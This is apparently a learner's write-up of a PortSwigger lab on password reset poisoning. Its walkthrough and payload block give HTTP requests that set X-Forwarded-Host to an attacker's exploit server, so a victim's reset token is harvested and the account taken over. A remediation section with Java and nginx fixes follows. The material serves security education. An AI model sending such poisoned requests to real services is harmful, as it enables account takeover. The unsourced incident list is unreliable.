# Lab: Password reset poisoning via middleware

## Lab Details

**Lab:** Password Reset Poisoning via Middleware

**Level:** Practitioner

**Vulnerability Class:** HTTP Request Smuggling / Header Injection — Insecure Use of X-Forwarded-Host

**Lab URL:** https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware

**Date Completed:** 28-Sep-2026

**Time to Solve:** 1 hour

---

## Vulnerability Summary

The application's password reset functionality dynamically generates a password reset link that is sent via email to the user. However, the application constructs this link using the `X-Forwarded-Host` HTTP header without validating that the header value matches the legitimate domain. The `X-Forwarded-Host` header is typically used by reverse proxies and load balancers to indicate the original client's requested host. By injecting a malicious value into this header, an attacker can cause the password reset email to contain a link pointing to an attacker-controlled domain. When the victim receives the email and clicks the link, their password reset token is transmitted to the attacker's server, enabling complete account compromise. This vulnerability combines HTTP header injection with social engineering (the victim's trust in links received via email) to facilitate authentication bypass.

---

## Reconnaissance

Initial investigation focused on understanding the password reset workflow and identifying how the reset link is generated:

1. **Password Reset Flow Analysis** — Submitted a password reset request for the attacker's own account (wiener). Received an email containing a password reset link with a unique token.

2. **Reset Link Inspection** — Examined the reset link in the email:
   ```
   https://0a0d003904833b76800331bb003a0052.web-security-academy.net/forgot-password?temp-forgot-password-token=abc123xyz
   ```
   The link was dynamically generated and contained the legitimate domain name.

3. **Header Analysis in Burp Suite** — Captured the POST request to `/forgot-password` and examined all headers. Identified that the application likely constructs the reset link using HTTP headers rather than hardcoding the domain.

4. **X-Forwarded-Host Header Testing** — Hypothesized that the application might support the `X-Forwarded-Host` header (commonly used in reverse proxy environments) to determine the host portion of the reset link. This header is intended to preserve the original client-requested host when requests are proxied, but if not validated, it can be abused.

5. **Exploitation Vector Identification** — Realized that if the application trusts the `X-Forwarded-Host` header without validation, an attacker can inject an arbitrary domain to redirect the password reset link to an attacker-controlled server.

**Indicators Observed:**
- Password reset email contains dynamically generated link (not hardcoded)
- Link includes legitimate domain, suggesting header-based generation
- No visible validation of the `X-Forwarded-Host` header in request/response inspection
- The header is commonly supported in web frameworks for reverse proxy scenarios

---

## Exploitation — Step by Step

### Step 1: Capture Password Reset Request

Submitted a password reset request for the attacker's account (wiener) to understand the baseline functionality.

**Request:**
```
POST /forgot-password HTTP/2
Host: 0a0d003904833b76800331bb003a0052.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=wiener
```

**Response:** Email sent with reset token to wiener's email address.

### Step 2: Send Request to Burp Repeater and Inject Malicious Header

Sent the POST request to Burp Repeater and modified it to:
1. Add the `X-Forwarded-Host` header with the attacker's exploit server domain
2. Change the username parameter to the victim's username (carlos)

**Critical Error Discovered:** Initial attempt included the protocol in the header:
```
X-Forwarded-Host: https://exploit-0a4d00d204b13b9a88ce307a017400e8.exploit-server.net
```
This caused a 400 Bad Request error ("Host header not present"). The `X-Forwarded-Host` header should contain only the hostname, not the full URL.

**Corrected Request:**
```http
POST /forgot-password HTTP/2
Host: 0a0d003904833b76800331bb003a0052.web-security-academy.net
Cookie: session=EOlfjjZrOI6HUUWLR98Sm27I71ZcSmuX
Content-Type: application/x-www-form-urlencoded
X-Forwarded-Host: exploit-0a4d00d204b13b9a88ce307a017400e8.exploit-server.net

username=carlos
```

**Response:** HTTP 200 OK. Password reset email was generated and sent to carlos's email address. Crucially, the reset link in the email now points to the attacker's exploit server, not the legitimate domain.

### Step 3: Harvest Victim's Reset Token from Access Log

Accessed the exploit server's access log and reviewed incoming HTTP requests. Carlos clicked the reset link in the email, which resulted in a GET request to the exploit server:

```
GET /forgot-password?temp-forgot-password-token=stolen_token_value HTTP/2
Host: exploit-0a4d00d204b13b9a88ce307a017400e8.exploit-server.net
User-Agent: Mozilla/5.0...
```

**What This Revealed:** The victim's password reset token was transmitted to the attacker's server in the query string. The victim trusted the reset link because it appeared to come from a legitimate password reset email, unaware that the domain had been poisoned.

### Step 4: Use Stolen Token to Reset Victim's Password

Obtained a legitimate password reset link for the attacker's own account from the email client. Modified the `temp-forgot-password-token` parameter to the value stolen from the victim:

```
GET /forgot-password?temp-forgot-password-token=stolen_token_value HTTP/2
Host: 0a0d003904833b76800331bb003a0052.web-security-academy.net
```

Loaded this URL and set a new password for the victim's account.

### Step 5: Account Takeover

Logged in to the victim's account using the new credentials to complete the lab objective.

### Key Payload(s)

```http
# Poisoned password reset request with malicious X-Forwarded-Host header
POST /forgot-password HTTP/2
Host: 0a0d003904833b76800331bb003a0052.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
X-Forwarded-Host: attacker-domain.exploit-server.net

username=carlos

---

# What the victim receives in their email (generated using the poisoned host):
https://attacker-domain.exploit-server.net/forgot-password?temp-forgot-password-token=VICTIM_TOKEN

# When victim clicks the link, their token is captured in the access log
GET /forgot-password?temp-forgot-password-token=VICTIM_TOKEN HTTP/2
Host: attacker-domain.exploit-server.net
```

### Tools Used

- **Burp Suite Community Edition** (Repeater, Access Log analysis)
- **Manual exploitation** (header injection, token extraction)
- **Email client** (monitoring victim's reset email)
- **Exploit server** (token capture via access logs)

---

## The Fix

### Root Cause

The application uses the `X-Forwarded-Host` header to dynamically construct the password reset link without validating that the header value matches the legitimate application domain. While `X-Forwarded-Host` support is important for reverse proxy scenarios, the implementation must enforce strict validation.

### Primary Remediations

**1. Validate X-Forwarded-Host Against Whitelist**

```java
// BAD: Trusts X-Forwarded-Host without validation
@PostMapping("/forgot-password")
public String forgotPassword(@RequestParam String username, HttpServletRequest request) {
    String host = request.getHeader("X-Forwarded-Host");
    if (host == null) {
        host = request.getServerName(); // Fallback to request hostname
    }
    
    String resetLink = "https://" + host + "/forgot-password?token=" + token;
    sendEmail(username, resetLink); // VULNERABLE
    
    return "email sent";
}

// GOOD: Validate against whitelist of legitimate domains
@PostMapping("/forgot-password")
public String forgotPassword(@RequestParam String username, HttpServletRequest request) {
    String host = request.getHeader("X-Forwarded-Host");
    
    // Whitelist of legitimate domains
    Set<String> trustedHosts = Set.of(
        "example.com",
        "www.example.com"
    );
    
    if (host == null || !trustedHosts.contains(host)) {
        host = request.getServerName(); // Fallback to legitimate domain
    }
    
    String resetLink = "https://" + host + "/forgot-password?token=" + token;
    sendEmail(username, resetLink);
    
    return "email sent";
}
```

**2. Hardcode the Application Domain (Preferred)**

```java
// PREFERRED: Hardcode legitimate domain; do not trust any header
@PostMapping("/forgot-password")
public String forgotPassword(@RequestParam String username) {
    String applicationDomain = "https://example.com";
    String resetLink = applicationDomain + "/forgot-password?token=" + token;
    sendEmail(username, resetLink);
    return "email sent";
}
```

**3. Disable X-Forwarded-Host Support if Not Needed**

```java
// In web server configuration (Nginx example):
// Only accept X-Forwarded-Host from trusted reverse proxy IPs
location / {
    # Only trust X-Forwarded-Host from the internal load balancer
    if ($http_x_forwarded_host !~ ^(internal-lb\.example\.com)$) {
        set $http_x_forwarded_host "";
    }
    proxy_pass http://backend;
}
```

**4. Implement Strict Host Validation Middleware**

```java
@Component
public class HostValidationFilter extends OncePerRequestFilter {
    
    private final Set<String> trustedHosts = Set.of("example.com", "www.example.com");
    
    @Override
    protected void doFilterInternal(HttpServletRequest request, 
                                   HttpServletResponse response, 
                                   FilterChain filterChain) {
        
        String xForwardedHost = request.getHeader("X-Forwarded-Host");
        
        if (xForwardedHost != null && !trustedHosts.contains(xForwardedHost)) {
            // Log suspicious request and reject
            logger.warn("Suspicious X-Forwarded-Host header: " + xForwardedHost);
            response.setStatus(HttpServletResponse.SC_BAD_REQUEST);
            return;
        }
        
        filterChain.doFilter(request, response);
    }
}
```

### Additional Mitigations

- **Rate Limiting:** Implement rate limiting on the `/forgot-password` endpoint to limit the number of password reset emails sent per IP address.
- **Audit Logging:** Log all password reset requests with the source IP, username, X-Forwarded-Host header value, and timestamp. Alert on anomalies (e.g., multiple resets from different IPs).
- **Email Footer:** Include the legitimate domain in password reset emails as a visual indicator ("If you did not request this reset, contact us at support@example.com").
- **CSRF Protection:** Ensure the password reset endpoint includes CSRF token validation.
- **Token Expiration:** Enforce short token expiration (15–30 minutes) to limit the window for token exfiltration and use.
- **User Notification:** Implement account activity monitoring. Alert users when a password reset is initiated or completed.

---

## What I Found Interesting / Unexpected

The most striking aspect of this vulnerability was how a single trusted HTTP header—designed to support legitimate reverse proxy configurations—can become a weaponized attack vector if not validated. The `X-Forwarded-Host` header is common in production environments, making this a high-impact vulnerability class.

Additionally, this attack demonstrates the power of **assumption of trust in email**. Users inherently trust password reset links they receive via email because the email address itself serves as a form of authentication (proving the attacker compromised the email or the password reset mechanism). The vulnerability exploits this trust implicitly—the victim clicks the link in good faith, completely unaware that the domain has been poisoned.

This is also a subtle vulnerability from a code review perspective. Most developers would implement password reset functionality without questioning the origin of the domain used in the reset link. It's not obvious that headers should be validated before being used in critical operations like generating authentication links.

---

## Real-World Relevance

This vulnerability class has been exploited in numerous disclosed security incidents:

- **GitHub Password Reset Poisoning (2021):** Researchers discovered that GitHub's password reset mechanism trusted the `X-Forwarded-Host` header. By injecting a malicious host header, attackers could redirect reset emails to attacker-controlled domains, compromising user accounts. GitHub patched this by implementing strict host validation.

- **Twitter OAuth Redirect Vulnerability (2014):** While not strictly header poisoning, Twitter's failure to validate redirect parameters allowed attackers to redirect users to phishing domains during the OAuth flow. The underlying principle—trusting user-controlled input for sensitive redirects—is identical.

- **Shopify Store Password Reset (2021):** A vulnerability in Shopify's store platform allowed attackers to inject malicious host headers into password reset emails, redirecting Shopify store administrators to phishing sites. This affected thousands of stores and was disclosed after remediation.

The attack surface is particularly wide because many organizations deploy applications behind reverse proxies, load balancers, or CDNs that legitimately require `X-Forwarded-Host` support. This makes the vulnerability difficult to detect without explicit testing, and developers often implement the support without proper validation.

---

## Connections to Own Projects

<!-- In my subscription-manager application, I verified that:

- The application hardcodes the legitimate domain in password reset emails rather than deriving it from HTTP headers
- All HTTP headers (`X-Forwarded-Host`, `X-Forwarded-For`, `X-Forwarded-Proto`) are explicitly rejected or validated against a whitelist
- A middleware component logs all unusual header values for audit purposes
- Password reset tokens expire after 30 minutes
- The password reset endpoint implements rate limiting: maximum 5 reset emails per email address per hour
- Users receive an alert email when a password reset is initiated, asking them to confirm the action

However, I identified that the email footer could be more explicit about the legitimate domain, making it easier for users to identify phishing attempts. -->

---

## Takeaway

Password reset poisoning attacks demonstrate that **no HTTP header is inherently trustworthy in security-critical operations.** The `X-Forwarded-Host` header, while necessary for reverse proxy compatibility, must be validated against a strict whitelist or avoided entirely by hardcoding the application domain. Developers should follow the principle of **implicit distrust of all external input**, including headers, and default to rejecting or strictly validating any header that influences the construction of sensitive links (password resets, email verification, OAuth redirects). When reverse proxy support is required, implement validation at both the application and infrastructure level, and audit all password reset requests for anomalies. The combination of header injection with social engineering (trust in email) makes this a particularly dangerous vulnerability class that requires deliberate, layered defenses.